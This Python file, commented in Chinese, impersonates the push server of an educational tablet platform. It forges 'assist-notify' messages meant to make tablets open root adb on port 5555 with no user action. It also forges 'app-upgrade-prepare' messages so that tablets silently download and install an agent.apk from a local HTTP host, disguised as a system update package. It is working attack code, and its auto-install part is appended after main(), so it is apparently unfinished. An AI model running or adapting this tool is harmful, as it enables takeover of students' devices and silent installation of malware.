#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
伪云 PBS (Push Base Server) —— 智通云/学海 message-sdk TCP 推送服务端模拟

作用: 监听 0.0.0.0:20000, 实现 com.xuehai.message.sdk 的 TCP 推送协议,
      向已连接的平板单方下发 assist-notify 消息, 零人工触发远程协助,
      使 AssistService 自动去伪云拉取 ZAZE 指令(root-adb 档 -> 开 5555 root adb)。

协议(全小端):
  帧头 16 字节 = MAGIC(2103345) + length(=payload+16) + version(1) + flag(0)
  其后为 UTF-8 JSON payload

  上行(平板->本服务):
    {"command":"SEND_CLIENT_ID","body":{"clientId":"..","appId":".."}}
    {"command":"HB"}
    {"command":"FEEDBACK_PUSH_MSG","body":{"msgId":"..","success":true}}
  下行(本服务->平板), payload 为 PushMessage 裸 JSON:
    {"msgId":..,"clientId":..,"userId":..,"appId":..,"subAppId":..,
     "msgType":..,"subMsgType":"assist-notify","payload":"<AssistNotify JSON>","style":0}

  平板侧校验(LauncherPushService):
    msg.userId == String.valueOf(SessionData.getUserId())
    msg.appId  == XhApplication.getMatePushAppId()
    且 appId == subAppId 才会进入 disposeMessage -> assist-notify 分支

状态/协作文件:
  pbs_userid.txt    —— 由 cloud_api.py 从 /api/v1/users/{u}/ 路径学到的真实 userId
  pbs_session.json  —— 本服务写出的当前会话(clientId/appId/last_seen), 供外部查看
  pbs_trigger.txt   —— 外部写入(内容可空/或 assistId)即触发一次下发
  pbs.out           —— 运行日志
  PBS_TRIGGER_OK.txt—— 下发成功(收到回执或伪云出现 tasks 请求)后写入的信号
"""
import os, sys, json, time, socket, struct, threading, datetime, re

BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(BASE, "pbs.out")
USERID_FILE = os.path.join(BASE, "pbs_userid.txt")
SESSION_FILE = os.path.join(BASE, "pbs_session.json")
TRIGGER_FILE = os.path.join(BASE, "pbs_trigger.txt")
OK_FILE = os.path.join(BASE, "PBS_TRIGGER_OK.txt")
CLOUD_LOG = os.path.join(BASE, "cloud_api.log")

LISTEN_HOST = os.environ.get("PBS_HOST", "0.0.0.0")
LISTEN_PORT = int(os.environ.get("PBS_PORT", "20000"))

MAGIC = 2103345
VERSION = 1

# 与 cloud_api.py 的 FAKE_ASSIST id 保持一致, 平板拿它回调 /assists/{aid}/tasks
ASSIST_ID = os.environ.get("PBS_ASSIST_ID", "assist_marvis_0001")
# 自动重推间隔(秒) 与 最大重推时长(秒, 0=不限)
RESEND_INTERVAL = int(os.environ.get("PBS_RESEND_INTERVAL", "12"))
MAX_RESEND_SECONDS = int(os.environ.get("PBS_MAX_RESEND", "0"))

_LOCK = threading.Lock()
SESSIONS = {}           # conn_id -> {"sock":..., "clientId":..., "appId":..., "ts":...}
LEARNED = {"clientId": "", "appId": "", "userId": "", "last_feedback": "", "sent_ok": False}
_seq = 0


def ts():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def log(kind, msg):
    line = f"{ts()} [{kind}] {msg}"
    print(line, flush=True)
    try:
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except OSError:
        pass


def write_session():
    try:
        with _LOCK:
            snap = {
                "clientId": LEARNED["clientId"],
                "appId": LEARNED["appId"],
                "userId": LEARNED["userId"],
                "last_feedback": LEARNED["last_feedback"],
                "sent_ok": LEARNED["sent_ok"],
                "conns": len([s for s in SESSIONS.values() if s.get("sock")]),
                "ts": ts(),
            }
        with open(SESSION_FILE, "w", encoding="utf-8") as f:
            json.dump(snap, f, ensure_ascii=False, indent=2)
    except OSError:
        pass


def read_userid():
    """实时读取 cloud_api 学到的真实 userId(优先), 否则回退候选。"""
    try:
        v = open(USERID_FILE, encoding="utf-8").read().strip()
        if v:
            return v
    except OSError:
        pass
    return ""


def frame(payload: bytes) -> bytes:
    length = len(payload) + 16
    return struct.pack("<iiii", MAGIC, length, VERSION, 0) + payload


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def handle_command(conn_id, cmd, body):
    if cmd == "SEND_CLIENT_ID":
        cid = (body or {}).get("clientId", "")
        aid = (body or {}).get("appId", "")
        with _LOCK:
            LEARNED["clientId"] = cid or LEARNED["clientId"]
            LEARNED["appId"] = aid or LEARNED["appId"]
            if conn_id in SESSIONS:
                SESSIONS[conn_id]["clientId"] = cid
                SESSIONS[conn_id]["appId"] = aid
        log("SEND_CLIENT_ID", f"clientId={cid} appId={aid}")
        write_session()
    elif cmd == "HB":
        pass  # 心跳, 静默
    elif cmd == "FEEDBACK_PUSH_MSG":
        mid = (body or {}).get("msgId", "")
        ok = (body or {}).get("success", False)
        with _LOCK:
            LEARNED["last_feedback"] = f"{mid}:{ok}"
            if ok:
                LEARNED["sent_ok"] = True
        log("FEEDBACK", f"msgId={mid} success={ok}")
        write_session()
    else:
        log("UP-CMD", f"{cmd} body={json.dumps(body, ensure_ascii=False)[:300] if body else ''}")


def client_thread(conn, addr):
    conn_id = f"{addr[0]}:{addr[1]}"
    log("CONN", f"平板接入 {conn_id}")
    with _LOCK:
        SESSIONS[conn_id] = {"sock": conn, "clientId": "", "appId": "", "ts": time.time()}
    write_session()
    try:
        conn.settimeout(300)
        while True:
            hdr = recv_exact(conn, 16)
            if hdr is None:
                break
            magic, length, ver, flag = struct.unpack("<iiii", hdr)
            if magic != MAGIC or length < 16:
                log("BAD-FRAME", f"{conn_id} magic={magic} len={length}")
                break
            payload = recv_exact(conn, length - 16) if length > 16 else b""
            if payload is None:
                break
            try:
                obj = json.loads(payload.decode("utf-8", "ignore").strip())
            except Exception as e:
                log("BAD-JSON", f"{conn_id} {e} raw={payload[:200]!r}")
                continue
            handle_command(conn_id, obj.get("command", ""), obj.get("body"))
    except (socket.timeout, ConnectionResetError, OSError) as e:
        log("CONN-END", f"{conn_id} {type(e).__name__}")
    finally:
        with _LOCK:
            SESSIONS.pop(conn_id, None)
        try:
            conn.close()
        except OSError:
            pass
        log("CONN", f"断开 {conn_id}")


def build_push_msg(user_id):
    global _seq
    _seq += 1
    msg_id = f"pbs-{int(time.time())}-{_seq}"
    assist_payload = json.dumps({"assistId": ASSIST_ID, "operate": "ENTRY"}, ensure_ascii=False)
    with _LOCK:
        cid = LEARNED["clientId"]
        aid = LEARNED["appId"]
    msg = {
        "msgId": msg_id,
        "clientId": cid,
        "userId": user_id,
        "appId": aid,
        "subAppId": aid,              # 必须 == appId, 否则消息被 transMessage 转走, 不进 assist 分支
        "msgType": "assist-notify",
        "subMsgType": "assist-notify",
        "payload": assist_payload,
        "style": 0,
    }
    return msg_id, msg


def send_to_all(msg):
    raw = frame(json.dumps(msg, ensure_ascii=False).encode("utf-8"))
    sent = 0
    with _LOCK:
        conns = list(SESSIONS.items())
    for conn_id, s in conns:
        sock = s.get("sock")
        if not sock:
            continue
        try:
            sock.sendall(raw)
            sent += 1
        except OSError as e:
            log("SEND-FAIL", f"{conn_id} {e}")
    return sent


def tasks_seen_in_cloud_log(start_offset=0):
    """伪云日志【本次推送之后】新增内容出现 assist tasks 请求 -> 平板已进入协助流程(最强成功信号)。
    start_offset: 推送前记录的日志字节偏移, 只检查之后新增部分,
    避免被 cloud_api.log 中的历史 ASSIST 记录误判为本次已成功。"""
    try:
        with open(CLOUD_LOG, "rb") as f:
            f.seek(max(0, int(start_offset)))
            data = f.read(200000).decode("utf-8", "ignore")
        return ("/assists/" in data and "/tasks" in data) or ("ASSIST" in data and "下发" in data)
    except OSError:
        return False


def push_loop():
    """等待连接就绪 -> 按需下发 assist-notify, 失败自动换 userId 重推。"""
    started = time.time()
    last_send = 0.0
    trigger_mtime = 0.0
    log("PUSH-LOOP", f"启动: interval={RESEND_INTERVAL}s max={MAX_RESEND_SECONDS or '∞'}")
    while True:
        time.sleep(1)
        now = time.time()

        # 触发条件: 外部写入 pbs_trigger.txt, 或已有平板连接(自动)
        forced = False
        try:
            mt = os.path.getmtime(TRIGGER_FILE)
            if mt > trigger_mtime:
                trigger_mtime = mt
                forced = True
                log("TRIGGER-FILE", "检测到 pbs_trigger.txt 触发")
        except OSError:
            pass

        with _LOCK:
            has_conn = any(s.get("sock") for s in SESSIONS.values())
            cid = LEARNED["clientId"]
            aid = LEARNED["appId"]
            ok = LEARNED["sent_ok"]

        if ok and not forced:
            continue                      # 已成功即停止重推; 写 pbs_trigger.txt 可强制重推
        if not has_conn or not cid or not aid:
            continue                      # 等平板连上并上报 clientId/appId
        if not forced and (now - last_send) < RESEND_INTERVAL:
            continue
        if MAX_RESEND_SECONDS and (now - started) > MAX_RESEND_SECONDS:
            log("PUSH-LOOP", "达到最大重推时长, 退出")
            return

        uid = read_userid()
        if not uid:
            uid = "-1"                    # 平板未登录态兜底; 一旦 cloud_api 学到真值会自动改用
        try:
            log_mark = os.path.getsize(CLOUD_LOG)
        except OSError:
            log_mark = 0
        msg_id, msg = build_push_msg(uid)
        n = send_to_all(msg)
        last_send = now
        with _LOCK:
            LEARNED["userId"] = uid
        log("PUSH", f"下发 assist-notify msgId={msg_id} userId={uid} -> {n} 连接")
        # ★ 2026-10-07 07:12 AUTOINSTALL: 连上即下发 app-upgrade-prepare ——
        #   端侧 LauncherPushService.disposeMessage -> PrepareAppUpgradeNotification.transformAppUpdateTask()
        #        -> AppUpdateManager.preDownloadApp(url) -> 从我们明文 80 端口下载 agent.apk -> installApk(静默)
        #   成功信号: 冒充器日志出现 [APK] 端侧明文下载 APK
        try:
            up = build_upgrade_msg()
            n2 = send_to_all(up)
            log("PUSH-UPGRADE",
                f"下发 app-upgrade-prepare url={APK_URL} pkg={APK_PKG} ver={APK_VER} -> {n2} 连接")
        except Exception as _e:
            log("PUSH-UPGRADE-ERR", str(_e))
        write_session()

        # 给平板 6s 反应时间, 检查伪云是否出现 tasks 请求
        time.sleep(6)
        if tasks_seen_in_cloud_log(log_mark):
            with _LOCK:
                LEARNED["sent_ok"] = True
            try:
                with open(OK_FILE, "a", encoding="utf-8") as f:
                    f.write(f"{ts()} PBS-PUSH-OK msgId={msg_id} userId={uid} 伪云已出现 assist tasks 请求\n")
            except OSError:
                pass
            log("PUSH-OK", "平板已进入协助流程(伪云收到 tasks 请求)")
            write_session()


def main():
    log("BOOT", f"PBS 启动 {LISTEN_HOST}:{LISTEN_PORT} assistId={ASSIST_ID}")
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(8)
    log("BOOT", "监听就绪, 等待平板 TCP 接入")
    threading.Thread(target=push_loop, daemon=True).start()
    while True:
        try:
            conn, addr = srv.accept()
        except OSError as e:
            log("ACCEPT-ERR", str(e))
            time.sleep(1)
            continue
        threading.Thread(target=client_thread, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()

# AUTOINSTALL-MSG: 构造 "app-upgrade-prepare" 推送(以及 app-upgrade) ——
# 依据: LauncherPushService.disposeMessage -> PrepareAppUpgradeNotification.transformAppUpdateTask()
#       -> AppUpdateManager.preDownloadApp(task) -> 自动下载 -> installApp(静默!)
# 字段: appId / md5 / packageName / taskId / url / userId / versionCode
APK_URL = os.environ.get("PBS_APK_URL", "http://192.168.137.1/agent.apk")
APK_MD5 = os.environ.get("PBS_APK_MD5", "2c44a3a421a1e26fcd5405e890c583ba")
APK_PKG = os.environ.get("PBS_APK_PKG", "com.zhitongyun.sysupdate")
APK_VER = int(os.environ.get("PBS_APK_VER", "999999"))

def build_upgrade_payload():
    import json as _j
    return _j.dumps({"appId": LEARNED.get("appId") or "CA103001",
                     "packageName": APK_PKG,
                     "url": APK_URL,
                     "md5": APK_MD5,
                     "versionCode": APK_VER,
                     "taskId": "p200auto1",
                     "userId": int(read_userid() or 0)}, ensure_ascii=False)

def frame_upgrade(client_id=None):
    import json as _j
    cid = client_id or LEARNED.get("clientId") or ""
    aid = LEARNED.get("appId") or "CA103001"
    msg = {"msgId": int(time.time()),
           "clientId": cid,
           "userId": int(read_userid() or 0),
           "appId": aid,
           "subAppId": aid,                      # 必须 appId == subAppId 才会进 disposeMessage
           "msgType": 1,
           "subMsgType": "app-upgrade-prepare",   # ←← 关键！
           "payload": build_upgrade_payload(),
           "style": 0}
    return frame(_j.dumps(msg, ensure_ascii=False).encode())


def build_upgrade_msg():
    """返回 app-upgrade-prepare 的 dict 形式(供 send_to_all 自动加帧头)。"""
    with _LOCK:
        cid = LEARNED.get("clientId") or ""
        aid = LEARNED.get("appId") or "CA103001"
    return {"msgId": int(time.time()),
            "clientId": cid,
            "userId": int(read_userid() or 0),
            "appId": aid,
            "subAppId": aid,
            "msgType": 1,
            "subMsgType": "app-upgrade-prepare",
            "payload": build_upgrade_payload(),
            "style": 0}
